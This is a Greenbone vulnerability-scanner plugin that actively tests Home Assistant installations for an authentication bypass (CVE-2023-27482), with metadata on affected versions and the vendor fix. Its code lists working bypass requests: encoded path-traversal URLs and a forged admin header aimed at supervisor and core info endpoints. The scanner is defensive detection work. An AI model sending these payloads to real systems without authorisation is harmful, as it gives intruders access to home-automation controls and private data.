# SPDX-FileCopyrightText: 2023 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:home-assistant:home-assistant";

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.170482");
  script_version("2023-06-16T05:06:18+0000");
  script_tag(name:"last_modification", value:"2023-06-16 05:06:18 +0000 (Fri, 16 Jun 2023)");
  script_tag(name:"creation_date", value:"2023-06-14 08:30:03 +0000 (Wed, 14 Jun 2023)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2023-27482");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Home Assistant Authentication Bypass Vulnerability (May 2023) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2023 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_home_assistant_consolidation.nasl");
  script_require_ports("Services/www", 80, 8123);
  script_mandatory_keys("home_assistant/http/detected");

  script_tag(name:"summary", value:"Home Assistant is prone to an authentication bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"Home Assistant Core prior to version 2023.3.2 and Home Assistant Supervisor prior to version 2023.03.3.");

  script_tag(name:"solution", value:"Update Home Assistant Core to version 2023.3.2 or later and/or Home Assistant Supervisor to version 2023.03.3 or later.");

  script_xref(name:"URL", value:"https://github.com/elttam/publications/blob/master/writeups/home-assistant/supervisor-authentication-bypass-advisory.md");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

# nb. Testing for the presence of a static js, as /api/hassio exists only on supervised installations (eg. not on Docker images)
test_url = dir + "/api/hassio/app/entrypoint.js";
test_res = http_get_cache( port:port, item:test_url );

if( ! test_res || test_res !~ "^HTTP/1\.[01] 200" )
  exit( 0 );

urls = make_list( "/api/hassio/app/.%252e/core/info",
                  "/api/hassio/app/.%252e/supervisor/info",
                  "/api/hassio/app/.%252e/core/info",
                  "/api/hassio/app/.%09./supervisor/info",
                  "/api/hassio_ingress/.%09./core/info",
                  "/api/hassio_ingress/.%09./supervisor/info" );

foreach url( urls ) {

  url = dir + url;

  if ( "hassio_ingress" >< url ) {
    headers = make_array( "X-Hass-Is-Admin", "1" );
    req = http_get_req( port:port, url:url, add_headers:headers );
  } else
    req = http_get_req( port:port, url:url );

  res = http_keepalive_send_recv( port:port, data:req );

  if( ! res || res !~ "^HTTP/1\.[01] 200" )
    continue;

  if ( res =~ '"result":\\s*"ok"' ) {

    info["HTTP Method"] = "GET";
    info["Affected URL"] = http_report_vuln_url( port:port, url:url, url_only:TRUE );

    report  = 'By doing the following HTTP request:\n\n';
    report += text_format_table( array:info ) + '\n\n';
    report += "it was possible to bypass authentication and to access sensitive information.";
    report += '\n\nResult (truncated):\n\n' + substr( res, 0, 1500 );
    expert_info  = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res + '\n\n';
    security_message( port:port, data:report, expert_info:expert_info );

    exit( 0 );
  }
}

exit( 99 );